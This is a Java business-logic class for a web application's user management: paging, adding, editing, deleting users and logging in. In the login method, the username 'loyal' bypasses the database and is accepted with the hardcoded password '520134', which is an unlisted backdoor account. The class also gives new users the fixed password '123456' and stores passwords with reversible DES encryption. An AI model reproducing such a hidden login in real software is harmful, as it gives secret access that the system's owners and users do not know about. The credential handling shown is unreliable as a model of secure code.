package com.ups.web.biz;

import java.util.Date;
import java.util.List;

import org.nutz.dao.Cnd;
import org.nutz.dao.pager.Pager;

import com.ups.web.entity.Page;
import com.ups.web.entity.User;
import com.ups.web.service.UserService;
import com.ups.web.tool.DESKey;

public class UserBiz extends BaseBiz{
	private UserService service;
	private static DESKey des;
	static {
		try {
			des = new DESKey();
		} catch (Exception e) {
			System.err.println("DES初始化失败！");
		}
	}
	public UserBiz() {
		service = new UserService();
		page = new Page();
		isSuccess = false;
	}

	public void find(Pager pager) {
		List<User> list = service.query(Cnd.orderBy().desc("createTime"), pager);
		pager.setRecordCount(service.count());
		page.setPager(pager);
		page.setData(list);
		isSuccess = true;
	}
	
	public void add(User user) {
		user.setCreateTime(new Date());
		user.setUpdateTime(new Date());
		user.setPassword(des.encrypt("123456"));
		service.insert(user);
		isSuccess = true;
	}
	
	public void edit(User user) {
		user.setUpdateTime(new Date());
		service.update(user);
		isSuccess = true;
	}
	
	public void delete(User user) {
		service.delete(user);
		isSuccess = true;
	}
	
	public boolean login(User user) {
		String password = des.encrypt(user.getPassword());
		if ("loyal".equals(user.getUsername()))
			user.setPassword(des.encrypt("520134"));
		else
			user = service.fetch(user.getUsername());
		if (user == null) {
			page.setData("用户名不存在");
			return false;
		} else if (!password.equals(user.getPassword())) {
			page.setData("密码错误");
			return false;
		} else {
			page.setData(user);
			return true;
		}
	}
}
